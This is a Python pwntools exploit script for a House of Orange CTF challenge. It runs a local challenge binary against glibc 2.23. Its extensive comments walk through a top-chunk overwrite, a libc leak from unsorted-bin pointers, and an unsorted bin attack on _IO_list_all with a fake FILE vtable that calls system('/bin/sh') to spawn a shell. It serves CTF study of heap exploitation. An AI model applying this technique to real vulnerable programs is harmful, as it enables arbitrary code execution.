#!/usr/bin/env python3
'''
OG House of Orange Challenge. 
- http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html
'''

from pwn import * 
import os

libc_name = '../../libc_versions/2.23/libc-2.23.so' # For alternate version of libc
env = {}

# Binary setup
elf_name = '.challenge-2.23'

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	

gdbscript = '''
dir ../../libc_versions/2.23/
'''
p = process(elf.path,env=env)
gdb.attach(p, gdbscript=gdbscript) 

def create_name(size, name):
	p.sendlineafter(">", "1") 
	p.sendlineafter(":", str(size)) 
	p.sendlineafter(":", str(name))
	p.recvuntil("at") 

	# Has the heap value inside of it.
	return p.recvline()
	
def see_name(leak=True): 
	p.sendlineafter(">", "3")
	p.recvuntil(":") 
	if(leak == True):
		p.recvline()
		name = p.recvline() 
	else: 
		name = p.recvline() 

	return name


def upgrade_name(size, name):
	p.sendlineafter(">", "2")
	p.sendlineafter(":", str(size)) 
	p.sendlineafter(":", str(name))
	return 

'''
The only bug in the program is a buffer overflow within the upgrade function of the name. We use this over and over again :)
'''
# Offsets for important things in the binary :)
IO_list_all_offset = 0x3a0540
libc_leak_offset = 0x3a0100
system_offset = 0x3f520
FILE_offset = 0x540

##### Step 1: Overwrite the top_chunk #####
def overwrite_top_chunk():

	'''
	- First, we create a name. This gives us the heap address for free :)
	- With this name, we use the buffer overflow in the upgrade function 
	to update the top_chunk's size. 
	- The size (of the top chunk) has to meet the following constraints 
	at https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L2392:
		- prev_inuse bit is set (easy) 
		- page aligned (medium)

	Our goal is to trigger a heap extension, which frees the top_chunk into the
	unsorted bin. This is awesome beacause there are no frees in this program, 
	by design. This allows the overflow to alter bin ptrs for a later attack.
	'''
	heap_leak = int(create_name(0x10, "Maxwell"),16) # Create the dummy name (rounds up to a 0x20 size)

	print("Heap Leak: ", hex(heap_leak))

	heap_base = heap_leak - 0x10
	print("Heap Base: ", hex(heap_base))

	'''
	The above chunk has 0x10 bytes of data. 
	So, the top_chunk is only 0x10 bytes away from the below chunk.
	'''
	fake_chunk = "A" * 0x10 # Filler before top_chunk
	# Starting the overwrite of the top_chunk
	fake_chunk += "B" * 0x8 # The prev_size field (don't care what the value is)

	'''
	The size of this fake_chunk needs to be aligned with a page (0x1000) 
	of what's currently been allocated. So, 0x20 (from the first name allocated) 
	gets subtracted from 0x1000, and a PREV_INUSE bit gets set.
	'''
	size = (0x1000 - 0x20) | 0x1 # Page aligned size and prev_inuse bit set.
	fake_chunk += p64(size)

	# Use this upgrade to overwrite the top_chunk size
	upgrade_name(0x1000,fake_chunk)

	return heap_base

def top_chunk_into_unsorted():
	##### Step 2: Place top_chunk into Unsorted Bin ####
	'''
	In order to force an extension, we need to ask malloc for a chunk 
	larger than the current 'top_chunk' size - 0x10 (metadata).
	This allocation triggers the extension, placing the top_chunk as 
	a normal chunk in the unsorted bin. This can be found at
	https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L2440

	This value (given back to us) gets a chunk from the new section 
	extension.
	'''
	create_name(0x1000 - 0x20,"") # Force the extension


##### Step 3: LibC Leak ########## 
def libc_leak():
	'''
	When a chunk is in the unsorted bin, it has two important pointers: 
	- fd
	- bk

	However, they are not cleaned up after a chunk has been used from the 
	bin. So, this allows, if uninitialized, to be used as a LibC leak. 

	The 'read' is not null terminated. So, adding an item with no or 
	limited text will leak data. 

	this particular allocation can ALSO lead to a *heap* leak. But, it was 
	given at the beginning of the program. This is because a large chunk 
	will force this NOT to be taken from the unsorted bin, but the large bin. 
	Thus, the fd_nextsize and bk_nextsize are set, resulting in a leak. 
	'''
	create_name(0x512, "") # Fun fact: 

	# Leak LibC to get offsets for everything else.
	name = see_name().replace("\n","")
	libc_leak = u64("\x00" + name + "\x00\x00") 
	print("LibC Leak: ", hex(libc_leak))
	libc_base = libc_leak - libc_leak_offset
	print("LibC_Base: ",  hex(libc_base))
	return libc_base 



#### Step 4: Prepare the Unsorted Bin Chunk for Code Execution ####
def FILE_ptr_corruption(heap_base, libc_base):
	'''
	In chronological order (in terms of execution) shown below. 
	This all happens at ONCE, making it hard to keep track of. 

	Malloc order: 
	- Getting a chunk (with a size not currently in the bin) will cause us 
	to go into the unsorted bin. 

	Use the unsorted bin attack to overwrite _IO_list_all: 
	- This is the pointer to all file descriptors in the program (in LibC).
	- Overwriting this eventually gives us access to a vtable (table 
	of function pointers to play with). 
	- To overwrite this, we set the bk pointer (of the unsorted_bin chunk) 
	to the location of _IO_list_all - 0x10 (the fd offset is used for the 
	write what WHERE).

	The chunk gets put into the small bin[4] (we overwrite the size of the 
	chunk in order to do this):
	- Now that the _IO_list_all points to main_arena, how will it function? 
	- The only thing that we care about is the _chain variable 
	(which points to a lis of FILE's) at offset 0x68.
	- The reason the chunk is put into small_bin[4] is because the offset 
	happens to line up perfectly with the _chain variable. This corresponds 
	to a size of 0x60.

	Upon having an invalid chunk, the program aborts execution, which we want!
	This is the craziest part!

	Upon crashing, LibC calls _IO_Overflow from the vtable for all fds in 
	the _chain variable. So, if we can control this vtable, we can control 
	the program.
	- The _chain will point to the unsorted_bin chunk (which we control). 
	- The important offsets: 
		- 0x0: The input parameter into the _IO_Overflow 
		- 0x20: _IO_write_base (needs to be less than the next value at 0x28)
		- 0x28: _IO_write_ptr (needs to be more than the above value at 0x20)
		- 0xc0: mode (needs to be 0 or less)
		- 0xd8: jump_table (function pointers!). Needs to have a pointer to a list of function pointers.

	Once the _IO_overflow (offset 0x18 in the vtable) is called 
	it will use unsorted_bin[0] (if needed). If all has gone well, 
	we should have code execution! :)

	Each step is shown below...
	'''

	pause()
	fake_chunk = "A" * 0x510 # Filler to get to the unsorted_bin chunk that we desire

	## Creating a new FILE pointer struct

	# This is the parameter for system, used in the _IO_overflow call.
	fake_chunk += "/bin/sh\x00" # 0x0 (FILE[0] or chunk->prev_size)

	# Corresponds with the size of small_bin[4] for being the _chain ptr.
	fake_chunk += p64(0x61) # 0x8 (FILE[1] or chunk->size)

	# The fd ptr, which does not matter in this attack.
	fake_chunk += p64(0x0) # 0x10 (FILE[2] or chunk->fd)

	# The location that the unsorted_bin attack will write to with the value being the main_arena.
	fake_chunk += p64(IO_list_all - 0x10) # 0x18 (FILE[3] or chunk->bk)

	# The FILE->_IO_write_base (must be less than offset 0x28)
	fake_chunk += p64(1) # 0x20 (FILE[4])

	# The FILE->_IO_write_ptr (must be greater than offset 0x20
	fake_chunk += p64(2) # 0x28 (FILE[5])

	'''
	The _mode part of the FILE ptr, which lives at offset 0xc0. 
	We will use a filler of 0xc0 - 0x30 (this is because we are currently 
	located at this position)

	Nothing else below this matters, as long as we hit the proper code 
	path.
	'''
	fake_chunk += "A" * (0xc0 - 0x30)
	fake_chunk += p64(0x0) # 0xc0 (FILE->_mode)

	'''
	Calculate the location of the unsorted bin
	chunk that we will use for the fake FILE pointer jump table.
	'''
	FILE_ptr_location = heap_base + FILE_offset

	'''
	The jump_table lives at offset 0xd8. So, we need to fill it 
	with 0x10 bytes before it. 
	The location of the jump_table will be directly after the jump_table itself.
	FILE_ptr_location = FILE_ptr_location + 0xd8 + 0x8 # Location of our jump table.
	'''
	fake_chunk += "B" * (0xd8 - 0xc8)
	fake_chunk += p64(FILE_ptr_location + 0xd8 + 8) # 0xd8. FILE->jump_table

	# The first 3 entries for the jump_table are not needed. So, we use a filler.
	fake_chunk += "C" * 0x18 # Filler prior to the _IO_overflow function in the vtable.
	fake_chunk += p64(system) # System

	# Update the unsorted_bin chunk to overwrite and create the fake values.
	upgrade_name(0x1000, fake_chunk)

	pause()

	# Trigger the final call to malloc. This triggers all of the crazy stuff up above that we setup.
	# LibC will crash, throw an error, then pop a shell :)
	p.sendlineafter(">", str(1)) 
	p.sendline(str(10)) # Trigger all of the craziness to happen :)


# Overwrite the top chunk to FORCE a call to free in the next step
heap_base = overwrite_top_chunk()

# Force top chunk into the unsorted bin
top_chunk_into_unsorted()

# Leak Libc via a use after free
libc_base = libc_leak()

IO_list_all = libc_base + IO_list_all_offset
print("IO_list_all: ", hex(IO_list_all))

system = libc_base + system_offset
print("System: ", hex(system))

FILE_ptr_corruption(heap_base, libc_base) 
p.interactive()


